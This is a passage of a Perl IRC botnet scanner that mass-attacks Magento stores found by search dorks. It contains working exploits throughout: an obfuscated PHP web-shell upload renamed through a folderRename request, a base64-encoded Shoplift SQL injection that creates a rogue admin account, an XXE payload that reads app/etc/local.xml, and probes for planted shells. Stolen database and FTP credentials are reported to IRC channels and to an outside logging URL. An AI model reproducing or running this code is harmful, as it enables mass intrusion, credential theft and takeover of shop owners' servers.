$header16 = "<?php eval(gzinflate(str_rot13(base64_decode('rUluQuNTEP3c/IpyG8mODnl1SOlRMDoK5oiuEBon/QLI2tiTcQ9717LXBIr4753dtVBlY5RJFyHhzJtsM/NpPBsoWEzGJRSyR1zM3d1ev8N0xN3iSAXK7cZEGFKD4cWVM3Jf2a1m0+v99Njp3vGKq1HWT5GA7PY73SVZ8Va7j/4KVEr0eTy+jM+G0ZjeIMrF1w1nFP45CaNkPBkNDD6V6QM60DEr56BVyhXk9S0T5E11cx1C0a1vM8hqRkDXQlzwGH1dVBvjXKbgtKWv/G3ksVtORZdcPSB7Z2caxufDkxDjh6entP/UgayCN5wu0FTnhbKAMsBnC0yp6YNgObirYRz7Pz46ORmhPrZduEiyUYrvxYzC8+E4fI7JGc9cbQsFK5ny5mXBkttCZnr1EpnTek+NVWebnrGKdORqfRoo0E+pb9/3W5VDr7aXeDG4JBGUaqDrdW24FgStA6wvwfrQ3JZXaN0vDhsD9/qdlVkv8A8ftD585rbT8jkcXzlWJgXoVsFOqXFdJrB++EFnPBpcjuPTwR/hxdFs6OgBVaFFnATPQSfD48lsazGOVMPh2LnxqF9x9ZyLyq+xEx/ui1mW4BWLAgejBKuuWrZaLF1CSv7jc3P/PTOzYnSmA8lPEm2guMrgYyK+CLkUcYdRPC8yINECsuzAt+jBtDzEHpqImcRKquJ/UPALViT2GPz80XzQ75Btq6wePfCnenkXerHWJaAu9bDDGA0oijJTt+fR3jszWdAfm6hsGhii/AEfkWCVwaNx/gzOvwXXim1KOn1hmI/qg4x4Zoq9DZZMLRLFpSDFEkYRnKhxmdr3KtEWM33dOqhHTBayZTW87fiOHj6DeXYoA26Q3s4e2lhDaCmINmvo2hzp45pMQrW1vsZ+ff1+bfT9Hr9WoVJlQ6QyJ7leFSjtpd6ahJm2A1cP35bwS+Y5E3Yr2QEXUq2IbSggoAruFSVN1YAmbFc30aie5vwZtzyU3LGsxu9fMp6zewzxaGSHQX+jScBGMSRsnSmOWFgZt52UKdbW3jak+/mXJib4NrOUnPIMWSO+9n7Rz4KnKYim3spJv+Eww/gG1uOov9Im51TL9nMVF7A00ftxvYg1fq2njd77rckjYKkfKFYySUiBbxsBtsgGo0a1Rdc2vK7u2hLVgl05NrZMo7XxQrle5cV37re6pog2oqkFUB4NYLauXrPRldPq4dygn2TSM5jLO4gtN6Sxxt1KI0dexDYKl+uqFs9xsaX8ECbs1GGNaR7w+oMUt8ATsViXecBEnSRDSFGhyfuWDBeVxbcI7ZMnfNdeKNyMfCMxviBTsAbLRn0xNVisKG59aX56dHTXfGMvSm2jx2MPiauJzA6z4+PrS7q2QTavynyVXjb5n+3/M718I/9Xwv/E6XEV2cmY8yrti+t/yhK2d1fMsCl9+LG5ljAWr6UKYinPxz+N82yNP2xjX5jLvNc0ek+R/h8='))));?>";
$header17 = 'Content-Disposition: form-data; name="upload-name"';
$header18 = 'explore';
$header19 = 'Content-Disposition: form-data; name="action"';
$header20 = 'upload';
$header21 = "-----------------------------41184676334--";
$header22 = 'X-Request: JSON';
$header23 = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
$header25 = 'json={"fn":"folderRename","args":["/explore.gif","explore.php"]}';
$header24 = "Content-Length: ".length($header25)."";
	# EOF COde ##
	my $remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$TARGET" ,PeerPort=>"80") or return;
	print $remote "$header1P2\n$header2\n$header3\n$header23\n$header22\n$header24\n\n$header25\n\n"; sleep(5);
	print $remote "$header1P2\n$header2\n$header3\n$header23\n$header22\n$header24\n\n$header25\n\n"; 
	print $remote "$header1P2\n$header2\n$header3\n$header23\n$header22\n$header24\n\n$header25\n\n"; sleep(3);
	print $remote "$header1P2\n$header2\n$header3\n$header23\n$header22\n$header24\n\n$header25\n\n";
	close($remote);
}

sub ftp_connect {
	my $url = $_[0];
	my $host = $_[1];
	my $user = $_[2];
	my $pass = $_[3];
	my $chan = $_[4];
	my $engine = $_[5];
	my $logo = $_[6];
	my $success = 1;
	use Net::FTP;
	my $ftp = Net::FTP->new($host, Debug => 0, Timeout => 7);
		$success = 0 if $ftp->login($user,$pass);
		$ftp->quit;
		if ($success == 0) {
		&msg("$admin","$jcelogo15$engine 9 [FTP] 15[ 4http://".$host." 15] [4 ".$user.":".$pass." 15]");

	}
}

sub shoplift() {
		my ($chan,$bug,$dork,$engine,$nick) = @_;

	my $count = 0;
	my @total =  &search_engine($chan,$bug,$dork,$engine,$magelogo,$nick);
	my $num = scalar(@total);
        if ($num > 0){
                foreach my $site(@total){
                $count++;
	        if ($count == $num-1) {
                        &msg("$channel","$magelogo15(7@2$engine15) 14Finish");
                        }
		my $test = "".$shopliftxpl."?target=http://".$site."&type=shoplift";
                my $htmlx = &get_content($test);
		my $testsql = "http://".$site."admin/Cms_Wysiwyg/directive/?forwarded=true&isIframe=true&___directive=e3tibG9jayB0eXBlPSJhZG1pbmh0bWwvcmVwb3J0X3NlYXJjaF9ncmlkIn19&filter=bnVtX3Jlc3VsdHNbZnJvbV09MCZudW1fcmVzdWx0c1tmaWVsZF9leHByXT0xPTIpO0RFTEVURSBGUk9NIGBhZG1pbl91c2VyYCBXSEVSRSB1c2VyX2lkID0gMTAwMDsgIERFTEVURSBGUk9NIGBhZG1pbl9yb2xlYCBXSEVSRSB1c2VyX2lkID0gMTAwMDsgIElOU0VSVCBJTlRPIGBhZG1pbl91c2VyYCAoYHVzZXJfaWRgLCBgZmlyc3RuYW1lYCwgYGxhc3RuYW1lYCwgYGVtYWlsYCwgYHVzZXJuYW1lYCwgYHBhc3N3b3JkYCwgYGNyZWF0ZWRgLCBgbW9kaWZpZWRgLCBgbG9nZGF0ZWAsIGBsb2dudW1gLCBgcmVsb2FkX2FjbF9mbGFnYCwgYGlzX2FjdGl2ZWAsIGBleHRyYWApIFZBTFVFUyAgKDk5LCdBdXRvJywgJ1VwZGF0ZScsICdhdXRvdXBkYXRlQG1hZ2VudG8nLCAnYXV0b3VwZGF0ZScsICdiYjE5MzIwZDEzODJjYzJkMDY5YTQyOGZkYTkyNTBkMTpSWGhWT0Z0MEh4TzJLMkl2ZmVIZmVhNjlJWmhsOVZOdycsICdudWxsJywgJ251bGwnLCAnbnVsbCcsIDEsIDAsIDEsICdOOycpOyAgSU5TRVJUIElOVE8gYGFkbWluX3JvbGVgIChgcGFyZW50X2lkYCwgYHRyZWVfbGV2ZWxgLCBgc29ydF9vcmRlcmAsIGByb2xlX3R5cGVgLCBgdXNlcl9pZGAsIGByb2xlX25hbWVgKSBWQUxVRVMgKDEsIDIsIDAsICdVJywgOTksICdhdXRvdXBkYXRlJyk7OyAtLQ==";
		&get_content($testsql);
		if ($htmlx =~ /is vulnerable/) {
		my $htmlsql = &get_content($testsql);}
		my $downloader = "http://".$site."/downloader/?return=http%3A%2F%2F".$site."%2Findex.php%2Fadmin%2F";
    	        my $ngecek = &get_content($downloader);
               	if ($ngecek =~ /Magento Downloader/) {		
		my ($useragent,$request,$response,%form);
		undef %form;
		$form{username}  = "autoupdate";
		$form{password}  = "Bangsat1!";
		$useragent = LWP::UserAgent->new(agent => $uagent);
		$useragent->timeout(20);
		$request   = POST $downloader,\%form;
		$response  = $useragent->request($request);
		if ($response->is_success) {
		my $res = $response->content;
		if ($res =~ /Upload package file/) {
		&get_content("".$botsaver."?x=[ShopLift] http://".$site."index.php/admin - Login Success");
		&msg("$channel","99[ShopLift] http://".$site."index.php/admin - 13Login Success");
		&msg("$admin","$magelogo15(13,1$engine13) 9http://".$site."index.php/admin 9- 13Login Success");
		&msg("$chanxxx","$magelogo15(13,1$engine13) 9http://".$site."index.php/admin 9- 13Login Success");}
		if ($res =~ /Warning: (.*)<\/h4/ ) {
		if ($res =~ /Warning: (.*)<\/h4/ ) {$warn=$1;}
		&get_content("".$botsaver."?x=[ShopLift] http://".$site." - ".$warn."");
		&msg("$channel","99[ShopLift] http://".$site." -4 $warn");
		&msg("$admin","$magelogo15(13,1$engine13) 9http://".$site." 9-4 $warn");
		&msg("$chanxxx","$magelogo15(13,1$engine13) 9http://".$site." 9-4 $warn");}
		if($res =~ /Invalid/) {
		my $dirk = "admin";
		&chkbegal($site,$dirk,$chan,$engine);}}}
		my $test1x = "http://".$site."skin/error.php";
		my $test2x = "http://".$site."skin/upil.php";
		my $test3x = "http://".$site."skin/skinmain.php";
		my $test4x = "http://".$site."skin/rss.php";
		my $test5x = "http://".$site."skin/skinwizard.php";
		my $test6x = "http://".$site."skin/skinwizard.php";
		my $test7x = "http://".$site."upil.php";
		my $test8x = "http://".$site."Neko.php";
		my $test9x = "http://".$site."error.php";
		my $test10x = "http://".$site."skin/repeat.php";
		my $test11x = "http://".$site."skin/total.php";
		my $test12x = "http://".$site."skin/Signedint.php";

		my $html1x = &get_content($test1x);
		if ($html1x =~ /post>Password:/) {
		&get_content("".$botsaver."?x=-SHELL- ".$test1x."");
		&msg("$admin","$magelogo15(13,1$engine13)8 ".$test1x."");
		&msg("$channel","$magelogo15(13,1$engine13)8 ".$test1x."");}

		my $html2x = &get_content($test2x);#sleep(1);
		if ($html2x =~ /GIF89GHZ/) {
		if ($html2x =~ /<b><br><br>(.*)<br>/){$osx=$1;}
		&get_content("".$botsaver."?x=-SHELL- ".$test2x." (OS:".$osx.")");
		&msg("$admin","$magelogo15(13,1$engine13)8 ".$test2x." 9".$osx."");
		&msg("$channel","$magelogo15(13,1$engine13)8 ".$test2x." 9".$osx."");}

		my $html3x = &get_content($test3x);
		if ($html3x =~ /post>Password:/) {
		&get_content("".$botsaver."?x=-SHELL- ".$test3x."");
		&msg("$admin","$magelogo15(13,1$engine13)8 ".$test3x."");
		&msg("$channel","$magelogo15(13,1$engine13)8 ".$test3x."");}

		my $html4x = &get_content($test4x);#sleep(1);
		if ($html4x =~ /GIF89a/) {
		&get_content("".$botsaver."?x=-SHELL- ".$test4x."");
		&msg("$admin","$magelogo15(13,1$engine13)8 ".$test4x."");
		&msg("$channel","$magelogo15(13,1$engine13)8 ".$test4x."");}

		my $html5x = &get_content($test5x);
		if ($html5x =~ /post>Password:/) {
		&get_content("".$botsaver."?x=-SHELL- ".$test5x."");
		&msg("$admin","$magelogo15(13,1$engine13)8 ".$test5x."");
		&msg("$channel","$magelogo15(13,1$engine13)8 ".$test5x."");}

		my $html6x = &get_content($test6x);
		if ($html6x =~ /post>Password:/) {
		&get_content("".$botsaver."?x=-SHELL- ".$test6x."");
		&msg("$admin","$magelogo15(13,1$engine13)8 ".$test6x."");
		&msg("$channel","$magelogo15(13,1$engine13)8 ".$test6x."");}
		
		my $html7x = &get_content($test7x);
		if ($html7x =~ /post>Password:/) {
		&get_content("".$botsaver."?x=-SHELL- ".$test7x."");
		&msg("$admin","$magelogo15(13,1$engine13)8 ".$test7x."");
		&msg("$channel","$magelogo15(13,1$engine13)8 ".$test7x."");}

		my $html8x = &get_content($test8x);
		if ($html8x =~ /GIF89a/) {
		&get_content("".$botsaver."?x=-SHELL- ".$test8x."");
		&msg("$admin","$magelogo15(13,1$engine13)8 ".$test8x."");
		&msg("$channel","$magelogo15(13,1$engine13)8 ".$test8x."");}

		my $html9x = &get_content($test8x);
		if ($html9x =~ /GIF89a/) {
		&get_content("".$botsaver."?x=-SHELL- ".$test9x."");
		&msg("$admin","$magelogo15(13,1$engine13)8 ".$test9x."");
		&msg("$channel","$magelogo15(13,1$engine13)8 ".$test9x."");}

		my $html10x = &get_content($test10x);
		if ($html10x =~ /GIF89a/) {
		&get_content("".$botsaver."?x=-SHELL- ".$test10x."");
		&msg("$admin","$magelogo15(13,1$engine13)8 ".$test10x."");
		&msg("$channel","$magelogo15(13,1$engine13)8 ".$test10x."");}

		my $html11x = &get_content($test11x);
		if ($html11x =~ /GIF89a/) {
		&get_content("".$botsaver."?x=-SHELL- ".$test11x."");
		&msg("$admin","$magelogo15(13,1$engine13)8 ".$test11x."");
		&msg("$channel","$magelogo15(13,1$engine13)8 ".$test11x."");}

		my $html12x = &get_content($test12x);
		if ($html12x =~ /GIF89a/) {
		&get_content("".$botsaver."?x=-SHELL- ".$test12x."");
		&msg("$admin","$magelogo15(13,1$engine13)8 ".$test12x."");
		&msg("$channel","$magelogo15(13,1$engine13)8 ".$test12x."");}
		
		}
	}
}

sub magadmin() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
	my @list = &search_engine($chan,$bug,$dork,$engine,$xmllogo);
	    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$channel","$xmllogo7,1[11#8 $engine 11#7]15 Scan finish"); }
            my $test = "http://".$site."index.php/admin";
			my $test1 = "http://".$site."app/etc/local.xml";
			my $test2 = "http://".$site."api/xmlrpc";
			my $test3 = "".$shopliftxpl."?target=http://".$site."/";			
			my $html = &get_content($test);
			if ($html =~ /username/ ) {
			my $dirk  = "admin";
			my $injek = "http://".$site.$dirk."/Cms_Wysiwyg/directive/?forwarded=true&isIframe=true&___directive=e3tibG9jayB0eXBlPSJhZG1pbmh0bWwvcmVwb3J0X3NlYXJjaF9ncmlkIn19&filter=bnVtX3Jlc3VsdHNbZnJvbV09MCZudW1fcmVzdWx0c1tmaWVsZF9leHByXT0xPTIpO0RFTEVURSBGUk9NIGBhZG1pbl91c2VyYCBXSEVSRSB1c2VyX2lkID0gMTAwMDsgIERFTEVURSBGUk9NIGBhZG1pbl9yb2xlYCBXSEVSRSB1c2VyX2lkID0gMTAwMDsgIElOU0VSVCBJTlRPIGBhZG1pbl91c2VyYCAoYHVzZXJfaWRgLCBgZmlyc3RuYW1lYCwgYGxhc3RuYW1lYCwgYGVtYWlsYCwgYHVzZXJuYW1lYCwgYHBhc3N3b3JkYCwgYGNyZWF0ZWRgLCBgbW9kaWZpZWRgLCBgbG9nZGF0ZWAsIGBsb2dudW1gLCBgcmVsb2FkX2FjbF9mbGFnYCwgYGlzX2FjdGl2ZWAsIGBleHRyYWApIFZBTFVFUyAgKDk5LCdBdXRvJywgJ1VwZGF0ZScsICdhdXRvdXBkYXRlQG1hZ2VudG8nLCAnYXV0b3VwZGF0ZScsICdiYjE5MzIwZDEzODJjYzJkMDY5YTQyOGZkYTkyNTBkMTpSWGhWT0Z0MEh4TzJLMkl2ZmVIZmVhNjlJWmhsOVZOdycsICdudWxsJywgJ251bGwnLCAnbnVsbCcsIDEsIDAsIDEsICdOOycpOyAgSU5TRVJUIElOVE8gYGFkbWluX3JvbGVgIChgcGFyZW50X2lkYCwgYHRyZWVfbGV2ZWxgLCBgc29ydF9vcmRlcmAsIGByb2xlX3R5cGVgLCBgdXNlcl9pZGAsIGByb2xlX25hbWVgKSBWQUxVRVMgKDEsIDIsIDAsICdVJywgOTksICdhdXRvdXBkYXRlJyk7OyAtLQ==";			
			my $execute = &get_content($injek);
			&chkdownload($site,$dirk,$chan,$engine); }
			my $html1 = &get_content($test1);
			if ($html1 =~ /<username><!\[CDATA\[(.*)\]\]\><\/username>/ ) {
			if ($html1 =~ /<frontName><!\[CDATA\[(.*)\]\]\><\/frontName>/){$dirs=$1;}
			if ($html1 =~ /<table_prefix><!\[CDATA\[(.*)\]\]\><\/table_prefix>/){$prefixs=$1;}
			my $injek1 = "http://".$site.$dirs."/Cms_Wysiwyg/directive/?forwarded=true&isIframe=true&___directive=e3tibG9jayB0eXBlPSJhZG1pbmh0bWwvcmVwb3J0X3NlYXJjaF9ncmlkIn19&filter=bnVtX3Jlc3VsdHNbZnJvbV09MCZudW1fcmVzdWx0c1tmaWVsZF9leHByXT0xPTIpO0RFTEVURSBGUk9NIGBhZG1pbl91c2VyYCBXSEVSRSB1c2VyX2lkID0gMTAwMDsgIERFTEVURSBGUk9NIGBhZG1pbl9yb2xlYCBXSEVSRSB1c2VyX2lkID0gMTAwMDsgIElOU0VSVCBJTlRPIGBhZG1pbl91c2VyYCAoYHVzZXJfaWRgLCBgZmlyc3RuYW1lYCwgYGxhc3RuYW1lYCwgYGVtYWlsYCwgYHVzZXJuYW1lYCwgYHBhc3N3b3JkYCwgYGNyZWF0ZWRgLCBgbW9kaWZpZWRgLCBgbG9nZGF0ZWAsIGBsb2dudW1gLCBgcmVsb2FkX2FjbF9mbGFnYCwgYGlzX2FjdGl2ZWAsIGBleHRyYWApIFZBTFVFUyAgKDk5LCdBdXRvJywgJ1VwZGF0ZScsICdhdXRvdXBkYXRlQG1hZ2VudG8nLCAnYXV0b3VwZGF0ZScsICdiYjE5MzIwZDEzODJjYzJkMDY5YTQyOGZkYTkyNTBkMTpSWGhWT0Z0MEh4TzJLMkl2ZmVIZmVhNjlJWmhsOVZOdycsICdudWxsJywgJ251bGwnLCAnbnVsbCcsIDEsIDAsIDEsICdOOycpOyAgSU5TRVJUIElOVE8gYGFkbWluX3JvbGVgIChgcGFyZW50X2lkYCwgYHRyZWVfbGV2ZWxgLCBgc29ydF9vcmRlcmAsIGByb2xlX3R5cGVgLCBgdXNlcl9pZGAsIGByb2xlX25hbWVgKSBWQUxVRVMgKDEsIDIsIDAsICdVJywgOTksICdhdXRvdXBkYXRlJyk7OyAtLQ==";
			my $execute1 = &get_content($injek1);
			&chkdownload($site,$dirs,$chan,$engine); }
			my $html2 = &get_content($test2);
			if ($html2 =~ /faultString/i ) {
			my $exl = &xxe_query($test2);
			if ($exl =~ m/PD94(.*)/){
			my $data = $1;
			my $hash = decode_base64($data);
			if ($hash =~ /<frontName><!\[CDATA\[(.*)\]\]\><\/frontName>/){$dir=$1;}
			if ($hash =~ /<table_prefix><!\[CDATA\[(.*)\]\]\><\/table_prefix>/){$prefix=$1;}
			my $injek2 = "http://".$site.$dir."/Cms_Wysiwyg/directive/?forwarded=true&isIframe=true&___directive=e3tibG9jayB0eXBlPSJhZG1pbmh0bWwvcmVwb3J0X3NlYXJjaF9ncmlkIn19&filter=bnVtX3Jlc3VsdHNbZnJvbV09MCZudW1fcmVzdWx0c1tmaWVsZF9leHByXT0xPTIpO0RFTEVURSBGUk9NIGBhZG1pbl91c2VyYCBXSEVSRSB1c2VyX2lkID0gMTAwMDsgIERFTEVURSBGUk9NIGBhZG1pbl9yb2xlYCBXSEVSRSB1c2VyX2lkID0gMTAwMDsgIElOU0VSVCBJTlRPIGBhZG1pbl91c2VyYCAoYHVzZXJfaWRgLCBgZmlyc3RuYW1lYCwgYGxhc3RuYW1lYCwgYGVtYWlsYCwgYHVzZXJuYW1lYCwgYHBhc3N3b3JkYCwgYGNyZWF0ZWRgLCBgbW9kaWZpZWRgLCBgbG9nZGF0ZWAsIGBsb2dudW1gLCBgcmVsb2FkX2FjbF9mbGFnYCwgYGlzX2FjdGl2ZWAsIGBleHRyYWApIFZBTFVFUyAgKDk5LCdBdXRvJywgJ1VwZGF0ZScsICdhdXRvdXBkYXRlQG1hZ2VudG8nLCAnYXV0b3VwZGF0ZScsICdiYjE5MzIwZDEzODJjYzJkMDY5YTQyOGZkYTkyNTBkMTpSWGhWT0Z0MEh4TzJLMkl2ZmVIZmVhNjlJWmhsOVZOdycsICdudWxsJywgJ251bGwnLCAnbnVsbCcsIDEsIDAsIDEsICdOOycpOyAgSU5TRVJUIElOVE8gYGFkbWluX3JvbGVgIChgcGFyZW50X2lkYCwgYHRyZWVfbGV2ZWxgLCBgc29ydF9vcmRlcmAsIGByb2xlX3R5cGVgLCBgdXNlcl9pZGAsIGByb2xlX25hbWVgKSBWQUxVRVMgKDEsIDIsIDAsICdVJywgOTksICdhdXRvdXBkYXRlJyk7OyAtLQ==";
			my $execute2 = &get_content($injek2);
			&chkdownload($site,$dir,$chan,$engine); } }
			my $testa = "".$shopliftxpl."?target=http://".$site."/";
			my $htmla = &get_content($testa);
			if ($htmla =~ /is vulnerable/) {
######## XTEAM 2016 ########
my $xteam    = "http://".$site."/console.php";
my $oscheck = &get_content($xteam);
    if ($oscheck =~ /BiJiQ/) {
        if ($oscheck =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
        if ($oscheck =~ /Uname : (.*?)<\/b>/){$os=$1;}
        if ($oscheck =~ /uid=(.*?)gid=/){$uid=$1;}
######## XTEAM 2016 ########
&msg("$channnel","$xmllogo7,1[11#8 $engine 11#7]8,1 Shell 9 http://".$site."/ 15 (SafeMode=$safe) (OS=$os) uid=$uid ");sleep(2);
			&msg("$admin","$xmllogo7,1[11#8 $engine 11#7]8,1 Shell 9 http://".$site."/console.php 15 (SafeMode=$safe) (OS=$os) uid=$uid ");sleep(2); }

			
#my $testb = "http://".$site."/patch.php";
#my $htmlb = &get_content($testb);
#			if ($htmlb =~ /Completed All Jobs./) {
#						&msg("$admin","$xmllogo7,1[11#8 $engine 11#7]8,1 Patch 9 Patch Done Successfully ");sleep(2);
#			 	
#			} 
						
}}}

sub chkdownload {
my $site = $_[0];
my $dirr = $_[1];
my $chan = $_[2];
my $engine = $_[3];
		my $website = "http://".$site."downloader/";
		my $wbst = "http://".$site."downloader/index.php?A=settings";
		my $check = &get_content($website);
 			if ($check =~ /Magento Downloader/) { 					
 			my ($useragent,$request,$response,%form);
 			undef %form;
 			$form{username}  = "autoupdate";
 			$form{password}  = "Bangsat1!";
 			$useragent = LWP::UserAgent->new(agent => $uagent);
 			$useragent->timeout(10);
 			$request   = POST $website,\%form;
 			$response  = $useragent->request($request);
 			if ($response->is_success) {				
 			my $res = $response->content;
			if ($res =~ /Upload package file/ ) {
			&get_content("".$magelog."?x=-LOGIN- http://".$site."index.php/".$dirr."/ - Login Success");
			&msg("$chanxxx","7,1[11#8 $engine 11#7][11#9 Shoplift 11#7] 15http://".$site."index.php/".$dirr."/ 7[11# 9Login Sukses 11#)");
			&msg("$admin","7,1[11#8 $engine 11#7][11#8 Shoplift 11#7] 15http://".$site."index.php/".$dirr."/ 7[11#9Login Sukses 11#0)");
			&msg("$chanxxx","7,1[11#8 $engine 11#7][11#8 Login 11#7] 15http://".$site."downloader/ 7[11#9 CEK WRITABLE 11#7]");
			&msg("$admin","11,1(7@7$engine11)(8@7Login11) 7http://".$site."downloader/ 0(7@15CEK WRITABLE0)");			}			
			if ($res =~ /Warning: (.*)<\/h4/ ) {
			if ($res =~ /Warning: (.*)<\/h4/ ) {$warn=$1;}
			&get_content("".$magelog."?x=-LOGIN- http://".$site."index.php/".$dirr."/ - $warn");
			&msg("$chanxxx","7,1[11#8 $engine 11#7][11#9 Shoplift 11#7] 15http://".$site."index.php/".$dirr."/ 0(11#8 $warn 11#)");
			&msg("$chanxxx","7,1[11#8 $engine 11#7][11#15 Login 11#7] 15http://".$site.$dirr."/ 11-=- 8,1$warn");}			
}
}}
						
sub xxe_query() {
  my $jembut = $_[0];
  my $userAgent = LWP::UserAgent->new(agent => 'perl post');
          $b = "<?xml version=\"1.0\"?>";
          $b .= "<!DOCTYPE foo [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=app/etc/local.xml\"> ]>";
          $b .= "<methodCall><methodName>&xxe;</methodName></methodCall>";
  my $response = $userAgent->request(POST $jembut , Content_Type => 'text/xml', Content => $b);
  return $response->content;
 }

sub chkbegal {
my $site = $_[0];
my $dirr = $_[1];
my $chan = $_[2];
my $engine = $_[3];
		my $website = "http://".$site."downloader/";
		my $wbst = "http://".$site."downloader/index.php?A=settings";
		my $check = &get_content($website);
 			if ($check =~ /Magento Downloader/) { 					
 			my ($useragent,$request,$response,%form);
 			undef %form;
 			$form{username}  = "xSouL";
 			$form{password}  = "gentho";
 			$useragent = LWP::UserAgent->new(agent => $uagent);
 			$useragent->timeout(10);
 			$request   = POST $website,\%form;
 			$response  = $useragent->request($request);
 			if ($response->is_success) {				
 			my $res = $response->content;
		if ($res =~ /Upload package file/ ) {
		&get_content("".$botsaver."?x=-SHOPLIFT- http://".$site."index.php/".$dirr."/ - Login Success xSouL Kontol");
		&msg("$channel","99[ShopLift] http://".$site."index.php/".$dirr."/ - 13Login Success xSouL Kontol");
		&msg("$admin","$magelogo15(13,1$engine13) 9http://".$site."index.php/".$dirr."/ 9- 13Login Success xSouL Kontol");}
		if ($res =~ /Warning: (.*)<\/h4/ ) {
		if ($res =~ /Warning: (.*)<\/h4/ ) {$warn=$1;}
		&get_content("".$botsaver."?x=-SHOPLIFT- http://".$site." - ".$warn."");
		&msg("$channel","99[ShopLift] http://".$site." -4 $warn");
		&msg("$admin","$magelogo15(13,1$engine13) 9http://".$site." 9-4 $warn");}
}}}

sub magsql() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
	my @list = &search_engine($chan,$bug,$dork,$engine,$magelogo);
	    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$channel","$magelogo14(4$engine14)3 Finished..."); }
		my $test = "http://".$site."/app/etc/local.xml";
            my $test2 = "http://".$site."phpmyadmin";    
            my $html = &get_content($test);
        if ($html =~ /dbname/i ) 
        {
            if ($html =~ /<key><!\[CDATA\[(.*)\]\]\><\/key>/) {$key=$1;}
            if ($html =~ /<host><!\[CDATA\[(.*)\]\]\><\/host>/) {$serverIP=$1;}
            if ($html =~ /<username><!\[CDATA\[(.*)\]\]\><\/username>/){$user=$1;}
            if ($html =~ /<password><!\[CDATA\[(.*)\]\]\><\/password>/){$pass=$1;}
            if ($html =~ /<dbname><!\[CDATA\[(.*)\]\]\><\/dbname>/){$dbname=$1;}
            if ($html =~ /<frontName><!\[CDATA\[(.*)\]\]\><\/frontName>/){$adminpage=$1;}
            my $check = &get_content("http://".$site."phpmyadmin");
            if ($check =~ /phpMyAdmin/) {
			&get_content("".$botsaver."?x=-PHPMYADMIN- http://".$site."phpmyadmin");
            &msg("$admin","$magelogo13 Hacked 13(4@13phpMyAdmin)  http://".$site."phpmyadmin");
			&msg("$chanxxx","$magelogo13 Hacked 13(4@13phpMyAdmin)  http://".$site."phpmyadmin");}
            my $checker = &get_content("http://".$site."phpinfo.php");
            if ($checker =~ /DOCUMENT_ROOT/) {
			&get_content("".$botsaver."?x=-PHPINFO- http://".$site."phpinfo.php");
            &msg("$admin","$magelogo13 Hacked 13(4@13Info)  http://".$site."phpinfo.php");
			&msg("$chanxxx","$magelogo13 Hacked 13(4@13Info)  http://".$site."phpinfo.php");}
            my $checkerz = &get_content("http://".$site."info.php");
            if ($checkerz =~ /DOCUMENT_ROOT/) {
			&get_content("".$botsaver."?x=-PHPINFO- http://".$site."info.php");
            &msg("$admin","$magelogo13 Hacked 7(4@7Info)  http://".$site."info.php");
			&get_content("".$botsaver."?x=-DATABASE- http://".$site." - Hostname: ".$serverIP." - Username: ".$user." - Password: ".$pass." - DBName: ".$dbname." - Panel: ".$adminpage." [+]key: ".$key."");
            &msg("$channel","4$magelogo4 6[+]Database[+]6 11http://".$site."11 6[+]hostname:6 11".$serverIP."11 6[+]username:6 11".$user."11 6[+]password:6 11".$pass."11 6[+]dbname:6 11".$dbname."11 6[+]admipage:6 11".$adminpage."11 6[+]key:6 11".$key."11");
            &msg("$admin","4$magelogo4 6[+]Database[+]6 11http://".$site."11 6[+]hostname:6 11".$serverIP."11 6[+]username:6 11".$user."11 6[+]password:6 11".$pass."11 6[+]dbname:6 11".$dbname."11 6[+]admipage:6 11".$adminpage."11 6[+]key:6 11".$key."11");
			&msg("$chanxxx","4$magelogo4 6[+]Database[+]6 11http://".$site."11 6[+]hostname:6 11".$serverIP."11 6[+]username:6 11".$user."11 6[+]password:6 11".$pass."11 6[+]dbname:6 11".$dbname."11 6[+]admipage:6 11".$adminpage."11 6[+]key:6 11".$key."11");
            if ($user =~ /_/) {@users = split("_", $user); $usr = $users[0];}
            my $ceklog = "".$ftpxpl."?host=".$site."&user=".$usr."&pass=".$pass."";
            my $ceklog2 = "".$ftpxpl."?host=".$site."&user=".$user."&pass=".$pass."";
            my $ftplog = &get_content($ceklog);
            my $ftplog2 = &get_content($ceklog2);
                if ($ftplog =~ /FTP success!/) {
					&get_content("".$botsaver."?x=-FTP- ftp://".$site." - Username:".$usr." - Password:".$pass."");
                    &msg("$admin","$magelogo13[+]FTP[+] ftp://".$site." [+]username:".$usr." [+]password:".$pass."");
					&msg("$chanxxx","$magelogo13[+]FTP[+] ftp://".$site." [+]username:".$usr." [+]password:".$pass."");
                }
                if ($ftplog2 =~ /FTP success!/) {
					&get_content("".$botsaver."?x=-FTP- ftp://".$site." - Username:".$user." - Password:".$pass."");
                    &msg("$admin"," $magelogo13[+]FTP[+] ftp://".$site." [+]username:".$user." [+]password:".$pass."");
					&msg("$chanxxx"," $magelogo13[+]FTP[+] ftp://".$site." [+]username:".$user." [+]password:".$pass."");
                }
            my $port = "3306";
            my $platform = "mysql";
            my $dsn = "dbi:$platform:$dbname:$site:$port";
            my $DBIconnect=  DBI->connect($dsn,$user,$pass);
        if ($DBIconnect) {
		&get_content("".$botsaver."?x=-MYSQL- http://".$site." - Hostname:".$serverIP." - Username:".$user." - Password:".$pass." - DBName:".$dbname."");
        &msg("$channel","$magelogo6[+]MYSQL[+] 6[ 6http://".$site." [+]hostname:".$serverIP." [+]username:".$user." [+]password:".$pass." [+]dbname:".$dbname."  6] [4 Connected 4]");
        &msg("$admin","$magelogo6[+]MYSQL[+] 6[ 6http://".$site." [+]hostname:".$serverIP." [+]username:".$user." [+]password:".$pass." [+]dbname:".$dbname."  6] [4 Connected 4]");
		&msg("$chanxxx","$magelogo6[+]MYSQL[+] 6[ 6http://".$site." [+]hostname:".$serverIP." [+]username:".$user." [+]password:".$pass." [+]dbname:".$dbname."  6] [4 Connected 4]");
    }
            my $dsn2 = "dbi:$platform:$dbname:$serverIP:$port";
            my $DBIconnect2 = DBI->connect($dsn2,$user,$pass);
        if ($DBIconnect2) {
